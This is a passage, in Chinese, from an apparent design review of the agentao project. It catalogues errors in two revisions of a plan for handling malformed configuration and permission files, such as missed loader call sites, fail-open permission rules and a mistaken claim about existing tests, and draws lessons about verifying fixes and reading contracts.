1. **F1 只点了三个 loader 就声称已治理。** 五个用户手写配置上共有十个读取点；对启动最要命的两个 —— `cli/app.py:387`（早于 factory 运行）与 `cli/diagnostics/loaders.py:50`（`agentao doctor` 背后）—— 都不在清单里。
2. **「继续吞掉异常，错的只是沉默」与本文档自己的安全结论矛盾。** 加日志堵不住 `mcp_*` 的 fail-open。
3. **F2 只检查了未知键。** 七个类型失败未处理，其中六个在 `tool_planning.py:494` 上于 turn 中途抛出。
4. **选项 (c)（丢弃非法 allow、保留非法 deny）内部不一致** —— `{"tools": …}` 的拼错会让一条非法 deny 变成 deny 所有工具 —— 而且需要一张 rejected-rules 附表才能让 `get_rules_display()` 说实话。
5. **那条统一告警会在每次正常启动时触发**，因为 `permission_loader.py` 没有 `is_file()` 预检查，文件缺失是经 `OSError` 分支返回空的。

可推广的教训：rev 1 把每个**缺陷**都在公共 sink 上验证了，却只对着它一直在看的那三个文件验证了**修复**。可达性分析必须对补救方案重做一遍，不能从诊断阶段继承。

## 附录 C —— rev 2 自身的错误

rev 2 修好了 rev 1 的路线，却引入了自己的五个问题。记录于此，因为其中两条是本文档曾以「已核实」呈现的事实性错误。

| # | rev 2 的说法 | 更正 |
|---|---|---|
| 1 | 「F1 与 F2 独立，先后随意」 | **实现阻塞。** 只要 loader 仍返回裸规则字典，F1 承诺的 `路径 + 序号 + 原因` 错误就交付不了。已由 §4 的分层表修正 |
| 2 | `permissions.json` 出错就「中止会话创建」，一刀切 | 与 F1 同时要求保留的 `absent`/`unreadable`/`malformed` 模型**契约冲突**。诊断路径必须接住并报告，否则 `agentao doctor` 恰在最该用它的时候提前退出。已补例外条款，并加上 `collectors.py:101` 的镜像漂移风险 |
| 3 | `action` 大小写「留给实现者决定」 | **伪开放问题。** `configuration.md:161` 已规定大小写不敏感。并顺带暴露了 rev 2 漏掉的第二处契约变更 —— 同一行的「unknown values treated as `ask`」 |
| 4 | 「没有测试依赖现有行为」 | **事实错误。** `tests/test_permissions_modes.py:280::test_invalid_json_user_config_graceful_fallback` 断言的正是它。该结论背后的 grep 搜的是 "malformed/corrupt"，而测试名叫 "invalid_json" |
| 5 | 表格覆盖了「`configuration.md` 里人会手改的那些文件」 | **过度宣称。** run spec 未列；其中两行是 plugin 自带的 `.mcp.json` 而非 `.agentao/mcp.json`；`plugins_config.json` / manifest / hook 未普查。已改题为「按启动影响筛选的已确认受影响读取点」，并点名未纳入项 |

另已更正：`load_permission_rules` 有**五个**直接调用点而非六个 —— `cli/diagnostics/collectors.py` 是镜像了 loader 而非调用它，而这恰恰让附录 C 第 2 条从纸面问题变成承重问题。

**教训，与附录 B 的那条不同。** rev 2 的错误不是可达性错误，是**契约错误**。第 2、3、4 条每一条都是「提出一个变更，却没先读它会打破的契约」—— doctor 模型、`configuration.md:161`、`configuration.md:130`，以及钉住它的那个测试。rev 1 的教训是「对补救方案重做可达性验证」。rev 2 的教训是：**改行为之前，先 grep 谁写了它的文档、谁测了它。** 一个否定性 grep 只有在用了代码库实际使用的词汇时才算证据 —— 第 4 条恰恰栽在这里。
